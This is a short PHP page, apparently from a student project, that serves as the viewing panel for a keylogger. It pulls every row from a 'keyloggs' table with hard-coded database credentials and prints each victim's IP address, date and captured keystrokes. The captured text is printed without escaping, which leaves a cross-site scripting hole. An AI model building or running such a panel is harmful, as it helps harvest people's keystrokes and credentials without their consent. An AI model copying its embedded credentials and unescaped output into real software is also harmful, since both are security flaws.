<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>View Logs</title>
  <link rel="stylesheet" type="text/css" href="css.css">
  <link rel="stylesheet" href="https://unpkg.com/purecss@0.6.0/build/pure-min.css">
  <link rel="stylesheet" type="text/css" href="css.css">
</head>
<body>

<div class="pure-menu pure-menu-horizontal pure-menu-scrollable">
          <ul class="pure-menu-list">
              <li class="pure-menu-item"><a href="index.php" class="pure-menu-link">All Users</a></li>
              <li class="pure-menu-item"><a href="active.php" class="pure-menu-link ">All Active Users</a></li>
              <li class="pure-menu-item"><a href="logs.php" class="pure-menu-link">See Logs</a></li>
          </ul>
      </div>

<CENTER>
 <?php
//echo 'Current PHP version: ' . phpversion();
$servername = "tsuts.tskoli.is";
$username = "0211962669";
$password = "mypassword";
$dbname = "0211962669_loka";

// Create connection
$conn = new mysqli($servername, $username, $password, $dbname);
// Check connection
if ($conn->connect_error) {
     die("Connection failed: " . $conn->connect_error);
} 


$sql = "SELECT * FROM keyloggs";
$result = $conn->query($sql);

if ($result->num_rows > 0) {
     // output data of each row
     while($row = $result->fetch_assoc()) {

         echo " 
               <h1>Logs From ". $row["logger_ip"] . "</h1>
               <h3> Log date : ".$row["log_date"].
               "<p>".$row["log"]."</p> <br>
               _____________________________ <br>";
       
     }
} else {
     echo "0 results";
}

$conn->close();




?>  

<a class="pure-button pure-button-primary" href="alllogs.php">Refresh all logs</a>
</CENTER>
</body>
</html>
